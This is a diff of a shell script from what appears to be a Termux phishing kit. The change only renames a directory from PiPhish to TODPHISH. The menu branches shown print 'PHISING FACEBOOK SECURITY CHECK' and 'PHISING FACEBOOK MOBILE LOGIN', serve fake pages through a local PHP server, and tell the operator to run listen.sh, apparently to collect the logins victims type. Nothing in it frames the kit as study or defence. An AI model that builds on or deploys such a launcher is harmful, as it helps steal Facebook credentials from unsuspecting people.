@@ -65,7 +65,7 @@ echo $pur"now open new session and run listen.sh"
 echo $ku"__________________________________"
 sleep 1
 echo $pur"  PHISING FACEBOOK SECURITY CHECK  "
-php -S localhost:8080 -t /data/data/com.termux/files/home/PiPhish/V1
+php -S localhost:8080 -t /data/data/com.termux/files/home/TODPHISH/V1
 fi
 
 if [ $pil = 3 ]
@@ -75,7 +75,7 @@ sleep 1
 echo $pur"now open new session and run listen.sh"
 echo $ku"_________________________________"
 echo $pur"  PHISING FACEBOOK MOBILE LOGIN"
-php -S localhost:8080 -t /data/data/com.termux/files/home/PiPhish/V2
+php -S localhost:8080 -t /data/data/com.termux/files/home/TODPHISH/V2
 fi
 
 if [ $pil = 4 ]
